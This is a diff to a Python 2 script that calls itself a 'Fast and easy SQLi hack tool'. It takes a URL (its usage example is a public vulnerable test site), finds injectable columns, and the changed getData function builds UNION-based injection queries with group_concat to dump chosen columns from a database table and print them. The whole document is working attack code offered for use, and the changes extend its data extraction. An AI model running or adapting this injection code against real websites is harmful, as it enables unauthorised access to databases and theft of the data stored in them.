@@ -18,7 +18,7 @@ ____ _              ___      _                     _____
 
 More: https://www.facebook.com/TheCybersTeam
 Usage: python sqli.py --url http://testphp.vulnweb.com/listproducts.php?cat=1
-Fast and easy SQLi hack tool Beta 1.2
+Fast and easy SQLi hack tool Beta 1.3
 """
 print header
 
@@ -47,7 +47,7 @@ def getContent(url):
     return res.read()
 
 def status(i):
-    sys.stdout.write("\rColumns: {0}".format(i))
+    sys.stdout.write("\rColumns Total: {0}".format(i))
 
 def countColumns(url):
     key = "Th3Cyb3rsT34m"
@@ -154,14 +154,35 @@ def getColumns(table,database, volCol, columns, url):
 cols = getColumns(table,database,vulCol,columns, url)
 print "Columns: "+cols
 
-sys.stdout.write("\nColumn: ")
+sys.stdout.write("\nColumns names: ")
 column = raw_input()
+cols = column.split(",")
 
-def getData(column, table,database, volCol, columns, url):
+def getData(cols, table,database, volCol, columns, url):
     global build
-    url = build[0] + concat(column) + build[1] + " from+"+table
-    res = getContent(url)
-    return getVars(res)
+    line = ""
+    i = 0
+    title = ""
 
-data = getData(column,table,database,vulCol,columns, url)
-print "Data: "+data
+    for name in cols:
+        title+=name+"\t"
+        if i !=0:
+            line+=",0x3a,"
+        line+=name
+        i = i + 1
+
+    print title
+    url = build[0] + "concat(0x27,0x23,group_concat("+line+"),0x23,0x27)" + build[1]+ " from+"+table
+    res = getContent(url)
+    data = getVars(res)
+    rows = data.split(",")
+    
+    for j in rows:
+        line = ""
+        col = j.split(":")
+        for k in col:
+            line+=k+"\t"
+        print "\n\n"+line
+
+getData(cols,table,database,vulCol,columns, url)
+#print "Data: "+data
